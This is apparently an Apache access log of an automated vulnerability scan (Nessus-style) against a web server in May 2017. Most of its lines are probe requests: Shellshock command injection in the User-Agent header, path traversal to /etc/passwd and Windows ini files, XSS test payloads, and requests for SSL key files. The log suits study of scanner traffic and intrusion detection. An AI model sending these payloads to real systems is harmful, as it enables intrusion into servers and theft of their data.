192.168.2.50 - - [27/May/2017:07:42:24 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/5.0 (Windows NT 6.1; rv:53.0) Gecko/20100101 Firefox/53.0"
172.16.0.2 - - [27/May/2017:16:59:12 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:12 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:12 -0500] "GET /devinfo.xml HTTP/1.1" 404 508 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:12 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:12 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:12 -0500] "GET /ords/ HTTP/1.1" 404 502 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:12 -0500] "GET /apex/listenerConfigure HTTP/1.1" 404 519 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:19 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:19 -0500] "PROPFIND / HTTP/1.1" 405 574 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:19 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:19 -0500] "GET // HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:19 -0500] "GET /login.php HTTP/1.1" 404 520 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:19 -0500] "GET / HTTP/1.1" 200 17542 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:19 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:19 -0500] "POST /flex2gateway/http HTTP/1.1" 404 514 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:19 -0500] "POST /messagebroker/http HTTP/1.1" 404 515 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:19 -0500] "POST /blazeds/messagebroker/http HTTP/1.1" 404 523 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:19 -0500] "POST /lcds/messagebroker/http HTTP/1.1" 404 520 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET /index.php/123 HTTP/1.1" 404 510 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET /mxhelp/cgi-bin/namazucgi?lang=/../../../../../../../../../../../../../boot.ini HTTP/1.1" 404 521 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET /Websense/cgi-bin/WsCgiLogin.exe?Page=login&UserName=nessus%22%3e%3cscript%3ealert('websense_username_xss.nasl')%3c%2fscript%3e HTTP/1.1" 404 528 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET /console/faces/com_sun_web_ui/help/masthead.jsp?windowTitle=%3c/title%3e%3cscript%3ealert(%27sun_java_web_console_helpwindow_xss.nasl%27)%3c/script%3e HTTP/1.1" 404 543 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET /console/faces/com_sun_web_ui/help/helpwindow.jsp?windowTitle=%3c/title%3e%3cscript%3ealert(%27sun_java_web_console_helpwindow_xss.nasl%27)%3c/script%3e HTTP/1.1" 404 545 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET ftp://www.labmeinc.com/*<apache_mod_proxy_ftp_glob_xss.nasl> HTTP/1.0" 404 496 "-" "-"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET /home.jsf?autoScroll=0%2c275)%3b%2f%2f--%3e%3c%2fscript%3e%3cscript%3ealert('myfaces_tomahawk_autoscroll_xss.nasl' HTTP/1.1" 404 505 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET ftp://127.0.0.1/*<apache_mod_proxy_ftp_glob_xss.nasl> HTTP/1.0" 404 496 "-" "-"
172.16.0.2 - - [27/May/2017:16:59:21 -0500] "GET ftp://ftp/*<apache_mod_proxy_ftp_glob_xss.nasl> HTTP/1.0" 404 496 "-" "-"
172.16.0.2 - - [27/May/2017:16:59:24 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:25 -0500] "GET /altercast/AlterCast?op=%3cscript%3ealert(%22adobe_document_server_61.nasl%22)%3c%2fscript%3e HTTP/1.1" 404 516 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:27 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:31 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:32 -0500] "GET /index.aspx HTTP/1.1" 404 507 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:32 -0500] "GET /Default.aspx HTTP/1.1" 404 509 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /item.fts?href=%22%3E%3Cscript%3Ealert(%22ftgate_44002.nasl%22)%3C%2Fscript%3E%3B HTTP/1.1" 404 505 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /nul.dbm HTTP/1.1" 404 504 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /conf/ssl/apache/integrity-smartcenter.key HTTP/1.1" 404 538 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /scripts/w3who.dll HTTP/1.1" 404 514 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /conf/ssl/apache/integrity.key HTTP/1.1" 404 526 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET / HTTP/1.1" 200 17579 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /cgi-bin/faqmanager.cgi?toc=/etc/passwd%00 HTTP/1.1" 404 519 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /_mt/mt.cgi HTTP/1.1" 404 506 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /admin.cgi HTTP/1.1" 404 506 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /logon?onok=%22%3e%3cscript%3ealert('axon_logon_xss.nasl')%3c%2fscript%3e HTTP/1.1" 404 502 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /administrator.cgi HTTP/1.1" 404 514 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /DB4Web/nessus01:23/foo HTTP/1.1" 404 519 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /buglist.cgi HTTP/1.1" 404 508 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /search?NS-query-pat=..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini HTTP/1.1" 404 503 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /cgi/mid.cgi HTTP/1.1" 404 508 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET 1495922373:@10.6.66.80/ HTTP/1.1" 400 0 "-" "-"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /cgi-bin/admin.cgi HTTP/1.1" 404 514 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /search?NS-query-pat=../../../../../../../../../etc/passwd HTTP/1.1" 404 503 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:35 -0500] "GET /cgi-bin/admin.pl HTTP/1.1" 404 513 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cautoexec.bat HTTP/1.1" 404 528 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 518 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini HTTP/1.1" 404 529 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 515 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET 1495922373:@10.6.66.80/" 400 0 "-" "-"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /cgi-bin/count.cgi HTTP/1.1" 404 514 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /error/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot.ini HTTP/1.1" 404 524 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /cgi-bin/Count.cgi HTTP/1.1" 404 514 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 519 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /setup/setup-/../../log.jsp?log=info&mode=asc&lines=10 HTTP/1.1" 404 504 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 520 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /SiteScope/cgi/go.exe/SiteScope?page=eventLog&machine=&logName=System&account=administrator HTTP/1.1" 404 527 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 517 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "HEAD / HTTP/1.1" 200 311 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 518 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /.anydomain.test HTTP/1.0" 404 468 "-" "-"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /cgi-bin/help.cgi HTTP/1.1" 404 513 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /cgi-bin/hi HTTP/1.1" 404 507 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /php/php.exe?c:\\winnt\\win.ini HTTP/1.1" 404 471 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /cgi-bin/index.cgi HTTP/1.1" 404 514 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:38 -0500] "GET /cgi-bin/index.pl HTTP/1.1" 404 513 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:40 -0500] "GET /LoginPage.do HTTP/1.1" 404 509 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /status.xsl. HTTP/1.1" 404 508 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /cgi-bin/index.sh HTTP/1.1" 404 513 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /login_up.php3?login_name=x&passwd=x&locale_id=../../../../../../../../../../../../boot.ini%00.jpg HTTP/1.1" 404 510 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /cgi-bin/mailit.pl HTTP/1.1" 404 514 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 520 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /sc3/console.php?psid=101 HTTP/1.1" 404 512 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 519 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 527 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /CFIDE/administrator/index.cfm HTTP/1.1" 404 526 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET / HTTP/1.1" 200 17578 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 526 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /error_page.htm HTTP/1.1" 404 511 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 520 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1" 404 505 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 519 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /status HTTP/1.1" 404 503 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1" 404 505 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /cgi-bin/search HTTP/1.1" 404 511 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /global.asa HTTP/1.1" 404 507 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /cgi-bin/search.cgi HTTP/1.1" 404 515 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /..\\pixfir~1\\how_to_login.html HTTP/1.1" 404 526 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET / HTTP/1.1" 200 17579 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
172.16.0.2 - - [27/May/2017:16:59:41 -0500] "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 522 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /cgi-bin/test.cgi HTTP/1.1" 404 513 "-" "() { ignored; }; echo Content-Type: text/plain ; echo ; echo \"bash_cve_2014_6271_rce Output : $((43+1))\""
172.16.0.2 - - [27/May/2017:16:59:44 -0500] "GET /Reporting/login/change_password.php?enable_auth=0 HTTP/1.1" 404 532 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
